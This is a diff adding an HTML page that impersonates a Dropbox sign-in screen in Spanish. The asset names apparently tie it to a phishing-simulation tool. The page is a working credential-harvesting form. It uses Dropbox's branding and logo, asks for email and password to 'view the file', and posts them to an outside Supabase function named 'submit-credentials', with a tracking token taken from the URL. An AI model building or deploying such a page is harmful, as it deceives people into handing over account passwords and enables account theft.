@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="es"><head><meta charset="utf-8">
+<title>Dropbox - Iniciar sesión</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;background:#f7f9fa;font-family:'Atlas Grotesk',-apple-system,Arial,sans-serif;color:#1e1919;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .box{background:#fff;width:100%;max-width:420px;padding:40px 36px;border-radius:8px;box-shadow:0 1px 4px rgba(0,0,0,0.08)}
+  .logo{height:32px;margin-bottom:24px}
+  h1{font-weight:700;font-size:26px;margin:0 0 24px}
+  input{width:100%;padding:14px;font-size:15px;border:1px solid #ccc;border-radius:6px;outline:none;font-family:inherit;margin-bottom:14px}
+  input:focus{border-color:#0061FF;box-shadow:0 0 0 1px #0061FF}
+  button{display:block;width:100%;background:#0061FF;color:#fff;border:none;padding:14px;font-size:15px;font-weight:500;border-radius:6px;cursor:pointer;font-family:inherit;margin-top:12px}
+  button:hover{background:#0051cc}
+  .hint{font-size:13px;color:#637282;margin-top:16px;text-align:center}
+  a{color:#0061FF;text-decoration:none}
+</style></head>
+<body>
+<div class="box">
+  <img class="logo" src="https://cdn.jsdelivr.net/gh/mikel-santisteban/deceptics-email-assets@main/dropbox.png" alt="Dropbox">
+  <h1>Inicia sesión para ver el archivo</h1>
+  <form action="https://amjshbgyuazrtxrokqwy.supabase.co/functions/v1/submit-credentials" method="POST">
+    <input type="hidden" name="token" id="token-field">
+    <input type="email" name="email" placeholder="Correo electrónico" required autofocus>
+    <input type="password" name="password" placeholder="Contraseña" required>
+    <button type="submit">Iniciar sesión</button>
+  </form>
+  <p class="hint"><a href="#">¿Olvidaste tu contraseña?</a></p>
+</div>
+<script>document.getElementById('token-field').value=new URLSearchParams(location.search).get('t')||'';</script>
+</body></html>
